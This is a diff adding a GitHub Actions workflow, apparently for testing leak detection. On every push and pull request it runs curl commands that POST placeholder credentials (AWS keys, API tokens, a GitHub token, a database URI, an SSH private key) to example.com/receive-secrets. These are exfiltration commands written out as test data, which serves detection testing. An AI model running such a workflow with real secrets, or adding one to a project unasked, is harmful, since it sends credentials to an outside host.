@@ -1,0 +1,25 @@
+name: Test Leaks with cURL
+
+on:
+  push:
+    branches:
+      - main
+  pull_request:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Send cURL Requests
+        run: |
+          curl -X POST https://example.com/receive-secrets -d "secret=sk_test_4eC39HqLyjWDarjtT1zdp7dc"
+          curl -X POST https://example.com/receive-secrets -d "secret=AKIAIOSFODNN7EXAMPLE"
+          curl -X POST https://example.com/receive-secrets -d "secret=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+          curl -X POST https://example.com/receive-secrets -d "secret=AIzaSyDkF4AGtWZ5cghGk7tfmF2J1Ez6pYQm2fE"
+          curl -X POST https://example.com/receive-secrets -d "secret=mongodb://user:password@localhost:27017/mydb"
+          curl -X POST https://example.com/receive-secrets -d "secret=ya29.a0AfH6SMBwrvJd4XmNQeJUhnZ1z8lGowfPCkV7DXxa1HZ5f-VycnEvj-NhBKHfi3Hv5SlMhL5DhqLxAkJNG7tN_I0eO4zAAZm6p2EYdFfWa8T8lS18_xYh5F"
+          curl -X POST https://example.com/receive-secrets -d "secret=SuperSecretPassword123!"
+          curl -X POST https://example.com/receive-secrets -d "secret=-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAmIHNvbWUgaW5mbyBvcmcgZGVsaWZlcnkAAAA... -----END OPENSSH PRIVATE KEY-----"
+          curl -X POST https://example.com/receive-secrets -d "secret=ghp_4fX7z9tPq2IsTj6k4Gyb8OxYVXRGF9IovLrd"
+          curl -X POST https://example.com/receive-secrets -d "secret=AIzaSyCuPtmJt0VZn8u5F6ijw-AB12cBxx7TxI0"
